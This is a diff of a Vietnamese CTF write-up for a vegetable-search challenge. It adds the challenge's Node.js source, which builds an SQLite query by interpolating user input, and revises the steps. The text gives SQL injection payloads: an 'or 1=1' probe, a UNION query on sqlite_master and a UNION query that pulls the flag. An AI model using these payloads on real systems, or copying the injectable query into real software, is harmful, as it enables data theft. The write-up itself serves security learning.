@@ -11,10 +11,74 @@ Here's some sauce to go with the vegetables: index.js
 http://host.cg21.metaproblems.com:4010/
 
 **Overview** 
+```javascript
+const express = require('express');
+const Ajv = require('ajv');
+const sqlite = require('better-sqlite3');
 
-Sau click vào liên kết sẽ đưa chúng ta đến với một box tìm kiếm `Search for Vegetables`.  Không có gì khác ngoài việc thử bất cứ thứ gì liên quan đến SQL injection. Sử dụng `' or 1=1--`  mình thấy có list 2 cột hiện ra là `Vegetable Name` và  `Color`. 
+const sleep = (ms) => new Promise((res) => { setTimeout(res, ms) })
 
-Sau khi thực hiện một vài truy vấn tìm số cột và tên dbms mà thử thách dùng là sqlite, truy vấn sau để liệt kê tên table `'  union SELECT null,null,tbl_name FROM sqlite_master --` 
+// set up express
+const app = express();
+app.use(express.json());
+app.use(express.static('public'));
+
+// ajv request validator
+const ajv = new Ajv();
+const schema = {
+  type: 'object',
+  properties: {
+    query: { type: 'string' },
+  },
+  required: ['query'],
+  additionalProperties: false
+};
+const validate = ajv.compile(schema);
+
+// database
+const db = sqlite('db.sqlite3');
+
+// search route
+app.search('/search', async (req, res) => {
+  if (!validate(req.body)) {
+    return res.json({
+      success: false,
+      msg: 'Invalid search query',
+      results: [],
+    });
+  }
+
+  await sleep(5000); // the database is slow :p
+
+  const query = `SELECT * FROM veggies WHERE name LIKE '%${req.body.query}%';`;
+  let results;
+  try {
+    results = db.prepare(query).all();
+  } catch {
+    return res.json({
+      success: false,
+      msg: 'Something went wrong :(',
+      results: [],
+    })
+  }
+
+  return res.json({
+    success: true,
+    msg: `${results.length} result(s)`,
+    results,
+  });
+});
+
+// start server
+app.listen(3000, () => {
+  console.log('Server started');
+});
+```
+
+Sau click vào liên kết sẽ đưa chúng ta đến với một box tìm kiếm `Search for Vegetables`.  Trong file `index.js` dòng dễ bị tấn công sử dụng mã sau `const query = `SELECT * FROM veggies WHERE name LIKE '%${req.body.query}%';`;` 
+Sử dụng `' or 1=1--`  mình thấy có list 2 cột hiện ra là `Vegetable Name` và  `Color`. 
+
+Từ mã nguồn thấy rằng cơ sở dữ liệu trong thử thách dùng sqlite, để truy xuất tên table mình dùng`'  union SELECT null,null,tbl_name FROM sqlite_master --` 
 
 ```
 Color
@@ -24,13 +88,13 @@ the_flag_is_in_here_730387f4b640c398a3d769a39f9cf9b5
 veggies
 ```
 
-Bảng `the_flag_is_in_here_730387f4b640c398a3d769a39f9cf9b5` có dấu hiệu là bảng chứa thông tin flag. Tiếng hành truy xuất dữ liệu trong bảng xem kết quả có khả quan không
+Bảng `the_flag_is_in_here_730387f4b640c398a3d769a39f9cf9b5` có thể chứa flag. Tiến hành truy xuất dữ liệu trong bảng xem kết quả có khả quan không
 
 ```
 {"query":"' union select null,null,flag from the_flag_is_in_here_730387f4b640c398a3d769a39f9cf9b5--"}
 ```
 
-Kết quả flag trong phản hồi http.
+Từ đó mình nhận được flag
 
 ```
 {
